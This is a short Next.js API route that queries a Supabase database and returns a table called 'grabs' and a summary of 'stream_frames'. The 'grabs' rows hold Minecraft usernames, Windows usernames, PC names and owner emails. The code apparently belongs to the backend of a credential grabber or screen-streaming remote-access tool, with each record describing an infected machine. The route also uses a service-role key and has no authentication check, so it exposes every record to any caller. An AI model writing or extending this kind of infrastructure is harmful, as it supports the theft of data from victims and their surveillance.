import { createClient } from '@supabase/supabase-js';
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export async function GET() {
  const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY);
  
  const { data: grabs, error: errGrabs } = await supabase
    .from('grabs')
    .select('id, minecraft_username, windows_username, pc_name, owner_email, created_at, updated_at')
    .order('created_at', { ascending: false });

  const { data: allRows, error: errAll } = await supabase
    .from('stream_frames')
    .select('*');

  return NextResponse.json({
    now: new Date().toISOString(),
    grabs: grabs || [],
    errGrabs: errGrabs?.message || null,
    allRows: (allRows || []).map(r => ({ username: r.username, updated_at: r.updated_at, frameLen: r.frame?.length })),
    errAll: errAll?.message || null,
  });
}
